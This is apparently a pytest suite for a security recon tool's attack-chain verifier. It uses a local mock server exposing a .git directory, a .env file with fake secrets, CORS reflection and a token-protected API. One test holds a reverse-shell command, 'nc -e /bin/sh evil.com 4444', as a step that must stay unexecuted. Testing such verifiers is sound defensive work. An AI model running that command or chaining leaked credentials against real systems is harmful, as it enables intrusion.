"""
WebRipper Recon 5.0 — Validated Attack Chains Tests (Phase 4).

Tests for `app/chains/verifier.py`:
1. Local fixture server on ephemeral port testing:
   a) Source leak -> credential -> authenticated endpoint: verifies end-to-end as VERIFIED
      when all links confirm.
   b) Removing or failing any one link downgrades the chain to POSSIBLE/hypothetical.
2. Safe read-only canary verification:
   - Exposed .git/HEAD signature
   - CORS origin reflection with credentials
   - Non-blocking TCP port socket check
   - Placeholder bait credential rejection
   - Destructive / unprovable step preservation as hypothetical
3. Weakest-link rule mathematical compliance:
   Confidence(Chain) = min(step.confidence)
"""

from __future__ import annotations

import http.server
import json
import socket
import threading
from typing import Generator
import pytest

from app.chains.verifier import (
    ChainVerificationResult,
    ChainVerifier,
    StepVerificationResult,
    compute_chain_confidence,
    verify_attack_chains,
)
from app.correlator import correlate
from app.models import (
    AttackChain,
    AttackChainStep,
    Confidence,
    Finding,
    Severity,
)


# ---------------------------------------------------------------------------
# Mock Target HTTP Server on Ephemeral Port
# ---------------------------------------------------------------------------

_VALID_TOKEN = "sec_live_abcdef9876543210fedcba"


class MockTargetServer(http.server.BaseHTTPRequestHandler):
    """Local fixture HTTP server simulating targets with security findings."""

    def log_message(self, format: str, *args) -> None:
        """Suppress standard HTTP server logging during test runs."""
        pass

    def do_GET(self) -> None:
        path = self.path.split("?")[0]

        # 1. Exposed .git/HEAD
        if path == "/.git/HEAD":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ref: refs/heads/main\n")
            return

        # 2. Exposed .env file
        if path == "/.env":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(f"DB_PASS=SecretPass987\nAPI_KEY={_VALID_TOKEN}\n".encode("utf-8"))
            return

        # 3. Authenticated protected API endpoint
        if path in ("/api/protected", "/api/user"):
            auth_header = self.headers.get("Authorization", "")
            if auth_header == f"Bearer {_VALID_TOKEN}":
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"status": "ok", "user": "admin", "role": "superuser"}')
                return
            else:
                self.send_response(401)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"error": "unauthorized", "message": "invalid or missing token"}')
                return

        # 4. Forbidden endpoint
        if path == "/api/forbidden":
            self.send_response(403)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"error": "forbidden", "message": "administrative access restricted"}')
            return

        # 5. CORS reflection endpoint
        if path == "/cors-endpoint":
            origin = self.headers.get("Origin", "")
            self.send_response(200)
            if origin:
                self.send_header("Access-Control-Allow-Origin", origin)
                self.send_header("Access-Control-Allow-Credentials", "true")
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"data": "sensitive cors content"}')
            return

        # 6. Spring Boot Actuator endpoint
        if path == "/actuator/health":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status": "UP", "components": {"db": {"status": "UP"}}}')
            return

        # Default 404
        self.send_response(404)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Not Found")

    def do_POST(self) -> None:
        path = self.path.split("?")[0]

        # GraphQL Introspection endpoint
        if path == "/graphql":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length).decode("utf-8", errors="ignore")
            if "__schema" in body:
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"data": {"__schema": {"queryType": {"name": "Query"}}}}')
                return

        self.send_response(400)
        self.end_headers()


@pytest.fixture(scope="module")
def fixture_server() -> Generator[str, None, None]:
    """Start local fixture HTTP server on an ephemeral port."""
    server = http.server.HTTPServer(("127.0.0.1", 0), MockTargetServer)
    host, port = server.server_address[0], server.server_address[1]
    base_url = f"http://{host}:{port}"

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    yield base_url

    server.shutdown()
    server.server_close()
    thread.join(timeout=2.0)


@pytest.fixture(scope="module")
def fixture_tcp_port() -> Generator[int, None, None]:
    """Start local fixture TCP echo/banner socket on an ephemeral port."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("127.0.0.1", 0))
    port = sock.getsockname()[1]
    sock.listen(5)

    stop_event = threading.Event()

    def _serve():
        while not stop_event.is_set():
            try:
                sock.settimeout(0.5)
                client, _ = sock.accept()
                client.sendall(b"5.7.34-MySQL-Standard\n")
                client.close()
            except socket.timeout:
                continue
            except OSError:
                break

    thread = threading.Thread(target=_serve, daemon=True)
    thread.start()

    yield port

    stop_event.set()
    try:
        sock.close()
    except Exception:
        pass
    thread.join(timeout=2.0)


# ---------------------------------------------------------------------------
# Test Suite: Validated Attack Chains & Weakest-Link Rule
# ---------------------------------------------------------------------------

def test_source_leak_credential_authenticated_endpoint_verifies_end_to_end(fixture_server: str) -> None:
    """
    Requirement a:
    Source leak -> credential -> authenticated endpoint:
    Verifies end-to-end as VERIFIED when all links confirm.
    """
    chain = AttackChain(
        name="Source Code Leak → Credential Extraction → Authenticated Access",
        severity=Severity.CRITICAL,
        steps=[
            # Step 1: Exposed repository
            AttackChainStep(
                description="Exposed .git directory allows full repository inspection",
                source="paths",
                finding=Finding(
                    severity=Severity.HIGH,
                    category="paths",
                    title="Exposed .git Repository",
                    description="Exposed .git/HEAD was discovered",
                    url=f"{fixture_server}/.git/HEAD",
                    confidence="POSSIBLE",
                ),
            ),
            # Step 2: Extracted credential
            AttackChainStep(
                description="Repository contains hardcoded API credential",
                source="secrets",
                finding=Finding(
                    severity=Severity.HIGH,
                    category="secrets",
                    title="Hardcoded API Secret",
                    description="High entropy secret key found in source",
                    evidence=f"API_KEY = '{_VALID_TOKEN}'",
                    confidence="POSSIBLE",
                    metadata={"secret": _VALID_TOKEN},
                ),
            ),
            # Step 3: Authenticated endpoint
            AttackChainStep(
                description="Administrative endpoint accessible with credentials",
                source="endpoints",
                finding=Finding(
                    severity=Severity.CRITICAL,
                    category="endpoints",
                    title="Protected API /api/protected",
                    description="Administrative route requires bearer token",
                    url=f"{fixture_server}/api/protected",
                    confidence="POSSIBLE",
                ),
            ),
        ],
    )

    verifier = ChainVerifier(base_url=fixture_server, timeout=2.0)
    result = verifier.verify_chain(chain)

    # 1. Result summary checks
    assert isinstance(result, ChainVerificationResult)
    assert result.is_verified is True
    assert result.hypothetical is False
    assert result.confidence == Confidence.VERIFIED
    assert result.weakest_link_index is None

    # 2. Individual step checks
    assert len(result.step_results) == 3
    for s_res in result.step_results:
        assert s_res.is_verified is True
        assert s_res.confidence == Confidence.VERIFIED

    # 3. Chain instance in-place mutation checks
    assert chain.confidence == Confidence.VERIFIED
    assert chain.metadata["hypothetical"] is False
    assert chain.metadata["status"] == "VERIFIED"
    assert chain.metadata["weakest_link_step"] is None

    # 4. Independent weakest-link calculation
    conf, is_ver = compute_chain_confidence(chain)
    assert conf == Confidence.VERIFIED
    assert is_ver is True


def test_failing_source_leak_downgrades_to_hypothetical(fixture_server: str) -> None:
    """
    Requirement b (Fail Link 1):
    If the source leak is missing or returns 404, the chain confidence
    must downgrade to POSSIBLE and be marked hypothetical.
    """
    chain = AttackChain(
        name="Source Code Leak → Credential Extraction → Authenticated Access",
        severity=Severity.CRITICAL,
        steps=[
            # Step 1: Broken link (returns 404)
            AttackChainStep(
                description="Exposed .git directory allows full repository inspection",
                source="paths",
                finding=Finding(
                    severity=Severity.HIGH,
                    category="paths",
                    title="Exposed .git Repository",
                    description="Exposed .git/HEAD on non-existent path",
                    url=f"{fixture_server}/nonexistent_repo/.git/HEAD",
                    confidence="POSSIBLE",
                ),
            ),
            # Step 2: Valid credential
            AttackChainStep(
                description="Repository contains hardcoded API credential",
                source="secrets",
                finding=Finding(
                    severity=Severity.HIGH,
                    category="secrets",
                    title="Hardcoded API Secret",
                    description="High entropy secret key",
                    evidence=f"API_KEY = '{_VALID_TOKEN}'",
                    confidence="POSSIBLE",
                    metadata={"secret": _VALID_TOKEN},
                ),
            ),
            # Step 3: Valid endpoint
            AttackChainStep(
                description="Administrative endpoint accessible with credentials",
                source="endpoints",
                finding=Finding(
                    severity=Severity.CRITICAL,
                    category="endpoints",
                    title="Protected API /api/protected",
                    description="Administrative route requires bearer token",
                    url=f"{fixture_server}/api/protected",
                    confidence="POSSIBLE",
                ),
            ),
        ],
    )

    verifier = ChainVerifier(base_url=fixture_server, timeout=2.0)
    result = verifier.verify_chain(chain)

    assert result.is_verified is False
    assert result.hypothetical is True
    assert result.confidence == Confidence.POSSIBLE
    assert result.weakest_link_index == 0

    assert chain.confidence == Confidence.POSSIBLE
    assert chain.metadata["hypothetical"] is True
    assert chain.metadata["status"] == "HYPOTHETICAL"
    assert chain.metadata["weakest_link_step"] == 0

    conf, is_ver = compute_chain_confidence(chain)
    assert conf == Confidence.POSSIBLE
    assert is_ver is False


def test_failing_credential_downgrades_to_hypothetical(fixture_server: str) -> None:
    """
    Requirement b (Fail Link 2):
    If the discovered credential is invalid (e.g. revoked or wrong), probing
    the endpoint returns 401, breaking the chain.
    """
    invalid_token = "invalid-token-completely-wrong-12345"
    chain = AttackChain(
        name="Source Code Leak → Credential Extraction → Authenticated Access",
        severity=Severity.CRITICAL,
        steps=[
            # Step 1: Valid source leak
            AttackChainStep(
                description="Exposed .git directory",
                source="paths",
                finding=Finding(
                    severity=Severity.HIGH,
                    category="paths",
                    title="Exposed .git Repository",
                    description="Exposed .git/HEAD confirmed",
                    url=f"{fixture_server}/.git/HEAD",
                    confidence="POSSIBLE",
                ),
            ),
            # Step 2: Invalid credential
            AttackChainStep(
                description="Repository contains invalid credential",
                source="secrets",
                finding=Finding(
                    severity=Severity.HIGH,
                    category="secrets",
                    title="Revoked API Secret",
                    description="Revoked or invalid secret key",
                    evidence=f"API_KEY = '{invalid_token}'",
                    confidence="POSSIBLE",
                    metadata={"secret": invalid_token},
                ),
            ),
            # Step 3: Protected endpoint (will reject invalid credential)
            AttackChainStep(
                description="Administrative endpoint accessible with credentials",
                source="endpoints",
                finding=Finding(
                    severity=Severity.CRITICAL,
                    category="endpoints",
                    title="Protected API /api/protected",
                    description="Administrative route requires bearer token",
                    url=f"{fixture_server}/api/protected",
                    confidence="POSSIBLE",
                ),
            ),
        ],
    )

    verifier = ChainVerifier(base_url=fixture_server, timeout=2.0)
    result = verifier.verify_chain(chain)

    assert result.is_verified is False
    assert result.hypothetical is True
    assert chain.metadata["hypothetical"] is True
    assert chain.metadata["status"] == "HYPOTHETICAL"
    # Step 1 succeeded, step 2 and/or step 3 failed
    assert result.step_results[0].is_verified is True
    assert result.step_results[1].is_verified is False or result.step_results[2].is_verified is False


def test_failing_authenticated_endpoint_downgrades_to_hypothetical(fixture_server: str) -> None:
    """
    Requirement b (Fail Link 3):
    If the target endpoint returns 403 Forbidden or is non-existent,
    the weakest-link rule keeps the chain hypothetical.
    """
    chain = AttackChain(
        name="Source Code Leak → Credential Extraction → Authenticated Access",
        severity=Severity.CRITICAL,
        steps=[
            # Step 1: Valid .git/HEAD
            AttackChainStep(
                description="Exposed .git directory",
                source="paths",
                finding=Finding(
                    severity=Severity.HIGH,
                    category="paths",
                    title="Exposed .git Repository",
                    description="Exposed .git/HEAD path",
                    url=f"{fixture_server}/.git/HEAD",
                    confidence="POSSIBLE",
                ),
            ),
            # Step 2: Valid credential format
            AttackChainStep(
                description="Discovered AWS access key",
                source="secrets",
                finding=Finding(
                    severity=Severity.HIGH,
                    category="secrets",
                    title="AWS Access Key",
                    description="AWS Access key ID",
                    evidence="AKIAIOSFODNN7ABCD123",  # AWS format
                    confidence="POSSIBLE",
                    metadata={"secret": "AKIAIOSFODNN7ABCD123"},
                ),
            ),
            # Step 3: Forbidden endpoint (returns 403)
            AttackChainStep(
                description="Restricted admin route",
                source="endpoints",
                finding=Finding(
                    severity=Severity.CRITICAL,
                    category="endpoints",
                    title="Forbidden API Endpoint",
                    description="Forbidden endpoint",
                    url=f"{fixture_server}/api/forbidden",
                    confidence="POSSIBLE",
                ),
            ),
        ],
    )

    verifier = ChainVerifier(base_url=fixture_server, timeout=2.0)
    result = verifier.verify_chain(chain)

    assert result.is_verified is False
    assert result.hypothetical is True
    assert chain.confidence == Confidence.POSSIBLE
    assert chain.metadata["hypothetical"] is True
    assert chain.metadata["weakest_link_step"] == 2


def test_destructive_or_unprovable_step_remains_hypothetical(fixture_server: str) -> None:
    """
    Requirement b:
    If a step in the chain cannot be actively proven without destructive actions
    (e.g., executing an RCE payload or dropping a database), chain confidence stays
    POSSIBLE and is marked hypothetical.
    """
    chain = AttackChain(
        name="Source Code Leak → Remote Code Execution",
        severity=Severity.CRITICAL,
        steps=[
            # Step 1: Valid .git
            AttackChainStep(
                description="Exposed .git directory",
                source="paths",
                finding=Finding(
                    severity=Severity.HIGH,
                    category="paths",
                    title="Exposed .git Repository",
                    description="Exposed repository",
                    url=f"{fixture_server}/.git/HEAD",
                    confidence="POSSIBLE",
                ),
            ),
            # Step 2: Destructive action (cannot and must not be executed)
            AttackChainStep(
                description="Execute reverse shell payload on remote server",
                source="exploit",
                command="nc -e /bin/sh evil.com 4444",
                finding=Finding(
                    severity=Severity.CRITICAL,
                    category="exploit",
                    title="Remote Code Execution Payload",
                    description="Untested destructive reverse shell payload",
                    confidence="POSSIBLE",
                ),
            ),
        ],
    )

    verifier = ChainVerifier(base_url=fixture_server, timeout=2.0)
    result = verifier.verify_chain(chain)

    # Step 1 verifies
    assert result.step_results[0].is_verified is True
    # Step 2 is not verified destructively
    assert result.step_results[1].is_verified is False
    assert result.step_results[1].confidence == Confidence.POSSIBLE

    # Overall chain is hypothetical
    assert result.is_verified is False
    assert result.hypothetical is True
    assert chain.metadata["hypothetical"] is True
    assert chain.metadata["status"] == "HYPOTHETICAL"
    assert chain.metadata["weakest_link_step"] == 1


def test_placeholder_bait_credential_rejected(fixture_server: str) -> None:
    """Candidate secret matching documentation bait or dummy values is rejected."""
    chain = AttackChain(
        name="Documentation Bait Credential Chain",
        severity=Severity.MEDIUM,
        steps=[
            AttackChainStep(
                description="Candidate API token",
                source="secrets",
                finding=Finding(
                    severity=Severity.MEDIUM,
                    category="secrets",
                    title="Candidate Secret",
                    description="Placeholder secret",
                    evidence="API_KEY = 'your_api_key_placeholder'",
                    confidence="POSSIBLE",
                ),
            ),
        ],
    )

    verifier = ChainVerifier(base_url=fixture_server, timeout=2.0)
    result = verifier.verify_chain(chain)

    assert result.is_verified is False
    assert result.hypothetical is True
    assert chain.metadata["hypothetical"] is True


def test_cors_reflection_step_verifies(fixture_server: str) -> None:
    """Non-destructive CORS origin reflection verification."""
    chain = AttackChain(
        name="CORS Origin Reflection → Data Exfiltration",
        severity=Severity.HIGH,
        steps=[
            AttackChainStep(
                description="CORS vulnerability reflects origin with credentials",
                source="cors",
                finding=Finding(
                    severity=Severity.HIGH,
                    category="cors",
                    title="Reflected CORS Origin",
                    description="CORS reflection vulnerability",
                    url=f"{fixture_server}/cors-endpoint",
                    confidence="POSSIBLE",
                ),
            ),
        ],
    )

    verifier = ChainVerifier(base_url=fixture_server, timeout=2.0)
    result = verifier.verify_chain(chain)

    assert result.is_verified is True
    assert result.step_results[0].is_verified is True
    assert chain.confidence == Confidence.VERIFIED
    assert chain.metadata["hypothetical"] is False


def test_tcp_port_verification(fixture_tcp_port: int) -> None:
    """Non-destructive TCP socket connect confirms open port vs closed port."""
    verifier = ChainVerifier(timeout=2.0)

    # 1. Open port
    open_step = AttackChainStep(
        description=f"Database port {fixture_tcp_port} is open",
        source="portscan",
        finding=Finding(
            severity=Severity.HIGH,
            category="portscan",
            title=f"Open Port {fixture_tcp_port}",
            description=f"Database service on port {fixture_tcp_port}",
            evidence=f"port {fixture_tcp_port}",
            confidence="POSSIBLE",
            metadata={"port": fixture_tcp_port},
        ),
    )
    open_chain = AttackChain(name="Open Port Test", severity=Severity.HIGH, steps=[open_step])
    res_open = verifier.verify_chain(open_chain)
    assert res_open.is_verified is True
    assert open_chain.confidence == Confidence.VERIFIED

    # 2. Closed port
    closed_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    closed_sock.bind(("127.0.0.1", 0))
    closed_port = closed_sock.getsockname()[1]
    closed_sock.close()

    closed_step = AttackChainStep(
        description=f"Service port {closed_port} is open",
        source="portscan",
        finding=Finding(
            severity=Severity.HIGH,
            category="portscan",
            title=f"Port {closed_port}",
            description=f"Service port {closed_port}",
            evidence=f"port {closed_port}",
            confidence="POSSIBLE",
            metadata={"port": closed_port},
        ),
    )
    closed_chain = AttackChain(name="Closed Port Test", severity=Severity.HIGH, steps=[closed_step])
    res_closed = verifier.verify_chain(closed_chain)
    assert res_closed.is_verified is False
    assert closed_chain.confidence == Confidence.POSSIBLE
    assert closed_chain.metadata["hypothetical"] is True


def test_verify_attack_chains_convenience_function(fixture_server: str) -> None:
    """Test top-level verify_attack_chains function."""
    chain1 = AttackChain(
        name="Chain 1",
        severity=Severity.HIGH,
        steps=[
            AttackChainStep(
                description="Valid git head",
                source="paths",
                finding=Finding(
                    severity=Severity.HIGH,
                    category="paths",
                    title=".git head",
                    description="Git HEAD",
                    url=f"{fixture_server}/.git/HEAD",
                    confidence="POSSIBLE",
                ),
            )
        ],
    )
    chain2 = AttackChain(
        name="Chain 2",
        severity=Severity.HIGH,
        steps=[
            AttackChainStep(
                description="Missing path",
                source="paths",
                finding=Finding(
                    severity=Severity.HIGH,
                    category="paths",
                    title="Missing",
                    description="Missing path",
                    url=f"{fixture_server}/404_not_found",
                    confidence="POSSIBLE",
                ),
            )
        ],
    )

    verified = verify_attack_chains([chain1, chain2], base_url=fixture_server)
    assert len(verified) == 2
    assert verified[0].confidence == Confidence.VERIFIED
    assert verified[0].metadata["hypothetical"] is False
    assert verified[1].confidence == Confidence.POSSIBLE
    assert verified[1].metadata["hypothetical"] is True


def test_correlator_output_verification(fixture_server: str) -> None:
    """Test feeding findings through app/correlator.py and then app/chains/verifier.py."""
    findings = [
        Finding(
            severity=Severity.HIGH,
            category="paths",
            title="Exposed .git directory found",
            description="Exposed .git directory",
            evidence="ref: refs/heads/main",
            url=f"{fixture_server}/.git/HEAD",
            confidence="POSSIBLE",
        ),
        Finding(
            severity=Severity.CRITICAL,
            category="secrets",
            title="Database credential found in config",
            description="Found database credentials",
            evidence=f"db_password = '{_VALID_TOKEN}'",
            confidence="POSSIBLE",
            metadata={"secret": _VALID_TOKEN},
        ),
    ]

    # Generate correlated attack chains
    chains = correlate(findings)
    assert len(chains) >= 1
    chain = chains[0]

    # Run through ChainVerifier
    verifier = ChainVerifier(base_url=fixture_server)
    verifier.verify_chain(chain)

    assert "hypothetical" in chain.metadata
    assert "status" in chain.metadata
    assert "verification" in chain.metadata
    assert isinstance(chain.metadata["verification"]["steps"], list)
